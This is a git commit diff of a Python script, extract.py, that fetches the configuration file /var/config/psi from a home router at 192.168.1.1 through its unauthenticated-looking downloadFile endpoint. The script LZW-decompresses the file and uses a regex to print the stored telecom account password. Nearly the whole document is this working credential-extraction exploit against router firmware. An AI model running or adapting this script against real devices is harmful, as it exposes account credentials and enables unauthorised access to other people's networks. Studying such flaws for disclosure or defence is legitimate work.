635bedf2db179f2c60b633de2e0d650f9b8cd190
publicqi <qisu@ucsb.edu>
2021-10-07 01:28:03 +0800

    extract.py

--- extract.py
+++ extract.py
@@ -2,22 +2,34 @@ import lzw
 import re
 import sys
 import requests
-import log
+import logging as log
+
+# log.basicConfig(format="%(levelname)s: %(message)s", level=log.INFO)
 
 IP = "192.168.1.1"
+header_pattern = r'<compressed alg=lzw len=(\d+)>.+<crc=0x([0-9A-Fa-f]+)>'
+password_pattern = r'<X_CT-COM_TeleComAccount>.*\n.*<Password>(.*)</Password>'
 
-response = requests.get(IP + "downloadFile?file=/var/config/psi")
+response = requests.get("http://" + IP + "/downloadFile?file=/var/config/psi")
 assert response.status_code == 200
 
-compressed_data = response.text
+data = response.content
+header = data[:60]
+
+match = re.search(header_pattern, str(header))
+data_len = int(match.group(1))
+compressed_data = data[60:60 + data_len]
+
 try:
     # the file has multiple "pages" so we need to use the "PagingDecoder" here
     decoder = lzw.PagingDecoder(initial_code_size=258)
     log.info("LZW Decompressing data...")
     r = b"".join([b"".join(pg) for pg in decoder.decodepages(compressed_data)])
+    r = r.decode()
     log.info("OK.")
-    print(r)
+    match = re.search(password_pattern, str(r))
+    print("Password is: " + match.group(1))
 except Exception as e:
     log.info(e)
-    log.critical("Data decompression failed! Possible file corruption.")
+    log.info("Data decompression failed! Possible file corruption.")
     sys.exit(1)
